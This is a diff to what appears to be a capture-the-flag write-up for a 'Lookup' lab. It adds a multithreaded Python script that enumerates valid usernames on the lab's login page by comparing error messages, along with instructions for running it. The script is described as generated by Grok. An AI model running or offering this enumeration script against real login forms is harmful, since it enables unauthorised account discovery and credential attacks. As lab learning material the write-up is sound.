@@ -98,9 +98,82 @@ now again try to open on browser:
 <img width="1913" height="774" alt="image" src="https://github.com/user-attachments/assets/e809ea43-3818-4000-9c3d-a3e602ff4e80" />
 
 
-* Suspected username enumeration vulnerability
+now i try to find valid usernames instead on trying on admin
 
-Tools used:
+i try this script using grok ai ,it's gives me a faster script
+```bash
+
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import os
+
+# Define the target URL
+url = "http://lookup.thm/login.php"
+
+# Define the file path containing usernames
+username_file = "/usr/share/seclists/Usernames/Names/names.txt"  # Replace with your wordlist path
+
+# Fixed password for testing
+password = "password"
+
+# Custom headers (optional)
+headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
+}
+
+# Function to send POST requests and process responses
+def check_username(username):
+    # Prepare the POST data
+    data = {
+        "username": username,
+        "password": password
+    }
+    try:
+        # Send the POST request
+        response = requests.post(url, data=data, headers=headers)
+        # Check the response content
+        if "Wrong password" in response.text:
+            return f"Username found: {username}"
+        elif "wrong username" in response.text:
+            return None  # Silent for wrong usernames
+        else:
+            return f"[?] Unexpected response for username: {username}"
+    except requests.RequestException as e:
+        return f"[!] Request failed for username {username}: {e}"
+
+# Main function
+if __name__ == "__main__":
+    try:
+        # Check if wordlist exists
+        if not os.path.exists(username_file):
+            print(f"[!] Wordlist file '{username_file}' not found!")
+            exit(1)
+
+        # Read usernames from file
+        with open(username_file, "r") as file:
+            usernames = [line.strip() for line in file if line.strip()]
+
+        # Use ThreadPoolExecutor for concurrent requests
+        max_workers = 50  # Adjust this based on your system and target server's limits (e.g., 10-100)
+        print(f"Starting enumeration with {max_workers} concurrent threads...")
+
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            future_to_username = {executor.submit(check_username, username): username for username in usernames}
+            for future in as_completed(future_to_username):
+                result = future.result()
+                if result:
+                    print(result)
+
+        print("Enumeration complete.")
+    except Exception as e:
+        print(f"[!] An error occurred: {e}")
+```
+save this script with userenum.py 
+and give execute permision run with
+
+```bash
+python userenum.py
+```
 
 * `gobuster`
 * Browser manual testing
